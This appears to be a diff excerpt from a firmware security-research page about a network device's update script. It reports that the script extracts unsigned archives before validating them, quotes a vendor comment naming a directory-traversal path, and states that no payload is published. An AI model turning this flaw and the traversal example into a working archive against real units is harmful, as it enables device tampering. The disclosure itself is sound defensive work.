+>                     -> and its firewall is measurably ON: iptables-282F-rules has 0 inbound-NEW
+>                        ACCEPTs against 2 in every 205*/224*/234* ruleset, every probe REJECTed
+> ```
+> ⇒ **Source, the vendor's own words about the source, and a running unit — all three agree.**
+> ### ⚠️ **AND THE MEMBERSHIP SPLIT IS REAL AND SURVIVES: `rcS` INCLUDES `Y`, `swdl_client` DOES NOT**
+> **The two files agree on POLARITY and differ on MEMBERSHIP, and only on `Y`.**
+> ⇒ **A `…Y…` variant is UNHARDENED to `rcS` and PRODUCTION to `swdl_client`** — a unit in that
+> state disagrees with itself about what it is. **Someone will hit it.**
+> 📌 **Recorded because the worry that resolved the other way is worth keeping: a membership
+> disagreement did NOT imply a polarity disagreement.** ⭐ **Two files can differ on WHICH inputs
+> take a branch while agreeing perfectly on WHAT the branch does** — ⇒ ***check the two separately,
+> because one disagreement is not evidence of the other.***
 
 > ### ⚠️ A LATENT DISAGREEMENT BETWEEN TWO IMPLEMENTATIONS OF THE SAME TEST
 > ```
@@ -592,6 +872,30 @@ CWMP Download -> swdl_client -> activate_bank -> activate_fs -> set_hardened_sta
 ⛔ **`-noswap` is never passed** (the operation type is hardcoded), so `activate_bank` **does** run —
 which means **`uboot-install` rewrites both U-Boot banks first.** ⇒ **This is not a reversible probe.
 It rewrites bootloaders.**
+
+> ### ⚠️ **A PROPERTY OF THE VENDOR'S SCRIPT, RECORDED BECAUSE AN OWNER SHOULD KNOW IT — AND DELIBERATELY NOT WEAPONISED HERE**
+> **`swdl_client` extracts the served archive BEFORE it validates anything, and the vendor left the
+> guard as a comment:**
+> ```
+> :700  # TODO: need to ensure this is safe against directory traversal
+> :701  #       (e.g. tar file containing ../../../var/ipaccess/nv_env.sh ?!)
+> :714  ret=`... | tar x -C $STANDBY_IMAGE_DIR ...`     <- EXTRACT
+> :725  validate_bank $STANDBY_BANK                     <- VALIDATE, ELEVEN LINES LATER
+> ```
+> ⇒ ⭐⭐ **Extraction precedes validation, so a signature check CANNOT prevent a write — the files
+> are on disk before anything is verified.** **`validate_bank` stops a bad bank BOOTING; it does not
+> stop a bad archive UNPACKING.** ⭐ **The vendor's own `TODO`, naming the attack, is the strongest
+> available evidence that nobody added the guard.**
+> ### ⛔ **BOUND, CARRIED VERBATIM FROM THE LANE THAT READ IT**
+> ***"`bin/tar → busybox` (2014) and whether THIS busybox strips `..` is version-dependent and was
+> not executed."*** ⇒ ***UNGUARDED BY THE SCRIPT IS NOT DEMONSTRATED TRAVERSABLE.*** **busybox has
+> stripped leading `../` by default for much of its history; nobody has checked this build.**
+> ### 🔒 **AND THIS REPO DOES NOT PUBLISH A PAYLOAD FOR IT, BY POLICY AND ON PURPOSE**
+> **It is stated because a person who owns one of these needs to know their unit will unpack an
+> unsigned archive from whoever it is pointed at** — which is a reason to keep the ACS leg on a
+> network you control. ⛔ **It is not a walkthrough, and the crafted archives are not in this repo.**
+> ⭐ **Same judgement as the rest of this page: the mechanism stated accurately, stopping short of an
+> assembled article** — see the scope note in the [README](../README.md).
 
 📌 **And do not expect `ENV_FIREWALL_DISABLED` in `nv_env.sh` to do anything on its own** — that
 value is **dead state** for the running environment. The firewall follows `FS_VARIANT`, not the file.
